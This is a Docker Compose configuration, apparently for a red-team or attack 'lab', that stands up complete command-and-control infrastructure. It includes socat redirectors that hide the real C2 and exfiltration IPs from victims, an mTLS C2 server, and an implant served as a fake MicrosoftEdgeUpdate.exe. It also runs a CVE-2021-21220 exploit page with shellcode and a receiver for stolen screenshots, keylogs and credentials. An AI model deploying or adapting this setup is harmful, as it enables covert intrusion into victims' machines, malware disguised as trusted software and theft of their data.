# docker-compose.yml
# Six-container lab — each service mimics a separate piece of infrastructure:
#
#   "Machine 1" c2-redirector        :443   socat relay — victim-facing, hides real C2 IP
#   "Machine 2" c2-server         :443   mTLS C2 — backnet only, unreachable from victim
#   "Machine 3" delivery-server   :8443  nginx implant download — single-use token
#   "Machine 4" exploit-server    :8888  CVE exploit webpage — Node.js static server
#   "Machine 5" exfil-redirector  :9443  socat relay — victim-facing, hides real exfil IP
#   "Machine 6" exfil-receiver    :9443  HTTPS POST receiver — stores exfil data from implant
#
# C2 channel  (port 443,  mTLS)  : commands only — no bulk data
# Exfil channel (port 9443, HTTPS): data uploads only — screenshots, keylogs, creds
#
# Network topology:
#   frontnet  (victim-facing)  : c2-redirector, delivery-server, exploit-server, exfil-redirector
#   backnet   (internal only)  : c2-redirector, c2-server
#   exfilnet  (internal only)  : exfil-redirector, exfil-receiver
#
# Usage:
#   docker compose up --build        (build and start all)
#   docker compose up --build -d     (same, but detached)
#   docker compose down              (stop and remove containers)
#   docker compose logs -f           (tail logs from all)

services:

  # ── "Machine 1" Redirector (socat TCP relay) ──────────────────────────
  # Dumb pipe: forwards raw TCP bytes from victim:443 → c2-server:443.
  # Because it does not terminate TLS, the full mTLS handshake passes
  # through unchanged — no certificate modifications required.
  c2-redirector:
    image: alpine:latest
    container_name: c2-redirector
    hostname: c2-redirector
    command: >
      sh -c "apk add --no-cache socat > /dev/null 2>&1 &&
             exec socat TCP-LISTEN:443,fork,reuseaddr TCP:c2-server:443"
    ports:
      - "${C2_HOST_IP}:443:443"  # Bind only to c2-redirector IP alias — not the real C2 machine IP
    networks:
      - frontnet
      - backnet
    depends_on:
      - c2-server
    restart: unless-stopped

  # ── "Machine 2" C2 Server (mTLS listener) ─────────────────────────────
  # No host port mapping — reachable only via c2-redirector on backnet.
  # Handles C2 commands only — exfil data goes directly to exfil-receiver.
  c2-server:
    build:
      context: .
      dockerfile: c2-server/Dockerfile
    container_name: c2-server
    hostname: c2-server
    stdin_open: true             # Keep stdin open for docker attach
    tty: true                    # Allocate a TTY so the controller menu works
    volumes:
      - ./exfil-data:/opt/c2/exfil-data
    environment:
      - C2_HOST=0.0.0.0
      - C2_PORT=443
      # BP2: single-use enrollment token — validated when implant presents CSR
      - ENROLLMENT_TOKEN=${ENROLLMENT_TOKEN}
    networks:
      - backnet
    restart: unless-stopped

  # ── "Machine 3" Delivery Server (nginx implant download) ──────────────
  # Serves MicrosoftEdgeUpdate.exe behind a single-use DOWNLOAD_TOKEN.
  # Builds implant.exe via the 3-stage cross-compile pipeline.
  delivery-server:
    build:
      context: .
      dockerfile: delivery-server/Dockerfile
      target: delivery-runtime
      args:
        - C2_HOST_IP=${C2_HOST_IP}
        - EXFIL_HOST_IP=${EXFIL_HOST_IP}
        - ENROLLMENT_TOKEN=${ENROLLMENT_TOKEN}
        - DOWNLOAD_TOKEN=${DOWNLOAD_TOKEN}
    container_name: delivery-server
    hostname: delivery-server
    ports:
      - "${C2_HOST_IP}:8443:443"   # nginx HTTPS implant delivery — bound to c2-redirector IP only
    environment:
      - DOWNLOAD_TOKEN=${DOWNLOAD_TOKEN}
    networks:
      - frontnet
    restart: unless-stopped

  # ── "Machine 4" Exploit Server (CVE webpage) ──────────────────────────
  # Serves the CVE-2021-21220 exploit page with patched shellcode.
  # Completely separate from implant delivery — different container, different port.
  exploit-server:
    build:
      context: .
      dockerfile: delivery-server/Dockerfile
      target: exploit-runtime
      args:
        - C2_HOST_IP=${C2_HOST_IP}
        - ENROLLMENT_TOKEN=${ENROLLMENT_TOKEN}
        - DOWNLOAD_TOKEN=${DOWNLOAD_TOKEN}
    container_name: exploit-server
    hostname: exploit-server
    ports:
      - "${C2_HOST_IP}:8888:8888"  # CVE exploit webpage — bound to c2-redirector IP only
    environment:
      - EXFIL_HOST=exfil-redirector
    networks:
      - frontnet
    depends_on:
      - exfil-redirector
    restart: unless-stopped

  # ── "Machine 5" Exfil Redirector (socat TCP relay) ────────────────────
  # Dumb pipe: forwards raw TCP bytes from victim:9443 → exfil-receiver:9443.
  # Mirrors the C2 c2-redirector pattern — TLS passes through unchanged so the
  # real exfil-receiver IP never appears in victim-side network captures.
  exfil-redirector:
    image: alpine:latest
    container_name: exfil-redirector
    hostname: exfil-redirector
    command: >
      sh -c "apk add --no-cache socat > /dev/null 2>&1 &&
             exec socat TCP-LISTEN:9443,fork,reuseaddr TCP:exfil-receiver:9443"
    ports:
      - "${EXFIL_HOST_IP}:9443:9443"  # Bind only to exfil redirector IP alias — separate from C2 IP
    networks:
      - frontnet
      - exfilnet
    depends_on:
      - exfil-receiver
    restart: unless-stopped

  # ── "Machine 6" Exfil Receiver (HTTPS POST data sink) ─────────────────
  # Receives exfil data (screenshots, keylogs, creds, history) from the
  # implant via HTTPS POST on port 9443 — completely separate from the
  # C2 command channel on port 443.  No host port — reachable only via
  # exfil-redirector on exfilnet.
  exfil-receiver:
    build:
      context: .
      dockerfile: exfil-receiver/Dockerfile
    container_name: exfil-receiver
    hostname: exfil-receiver
    volumes:
      - ./exfil-data:/opt/exfil
    networks:
      - exfilnet
    restart: unless-stopped

# ── Networks ──────────────────────────────────────────────────────────────
networks:
  frontnet:
    driver: bridge   # Victim-facing: c2-redirector, delivery-server, exploit-server, exfil-redirector
  backnet:
    driver: bridge   # Internal only: c2-redirector + c2-server
  exfilnet:
    driver: bridge   # Internal only: exfil-redirector + exfil-receiver
